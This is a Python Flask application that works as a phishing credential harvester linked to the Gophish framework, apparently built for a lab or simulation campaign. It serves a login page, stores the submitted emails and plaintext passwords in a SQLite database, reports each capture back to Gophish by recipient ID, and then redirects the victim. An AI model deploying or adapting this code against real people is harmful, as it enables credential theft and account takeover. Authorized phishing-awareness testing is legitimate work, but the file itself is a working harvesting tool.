# app.py
from flask import Flask, request, render_template, redirect
import sqlite3, time, os, requests

DB = "results.db"
app = Flask(__name__, template_folder="templates")


# ----------------------------
# INIT DATABASE
# ----------------------------
def init_db():
    conn = sqlite3.connect(DB)
    conn.execute("""
    CREATE TABLE IF NOT EXISTS submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        ts INTEGER,
        rid TEXT
    )
    """)
    conn.commit()
    conn.close()


# ----------------------------
# SHOW LOGIN PAGE (GET)
# ----------------------------
@app.route("/", methods=["GET"])
def index():
    rid = request.args.get("rid", "")  # capture tracking ID
    return render_template("login.html", rid=rid)


# ----------------------------
# COLLECT DATA (POST)
# ----------------------------
@app.route("/collect", methods=["POST"])
def collect():
    email = request.form.get("email","").strip()
    password = request.form.get("password","")
    ts = int(time.time())
    campaign = request.args.get("campaign","lab-campaign")
    rid = request.args.get("rid", "")  # Get Gophish Recipient ID

    # 1️⃣ Store in your own database
    conn = sqlite3.connect(DB)
    try:
        conn.execute("INSERT INTO submissions (email, password, ts, campaign) VALUES (?,?,?,?)",
                     (email, password, ts, campaign))
    except sqlite3.OperationalError as e:
        if "no column named campaign" in str(e):
            conn.execute("INSERT INTO submissions (email, password, ts) VALUES (?,?,?)",
                         (email, password, ts))
        else:
            conn.close()
            raise
    conn.commit()
    conn.close()

    # 2️⃣ Send submission event back to Gophish
    try:
        if rid:
            # This is the URL Gophish uses to mark "Submitted Data"
            gophish_url = f"http://127.0.0.1:80/track?rid={rid}&status=submitted"

            # Use GET (Gophish listens for GET)
            requests.get(gophish_url, timeout=2)
            print(f"[+] Synced to Gophish for RID {rid}")
        else:
            print("[!] No RID found, cannot sync to Gophish")
    except Exception as e:
        print("Error syncing to Gophish:", e)

    # 3️⃣ Redirect user to success page
    return redirect("/success", code=302)



# ----------------------------
# SUCCESS PAGE
# ----------------------------
@app.route("/success")
def success():
    return render_template("success.html")


# ----------------------------
# START SERVER
# ----------------------------
if __name__ == "__main__":
    init_db()
    app.run(host="127.0.0.1", port=5000, debug=True)
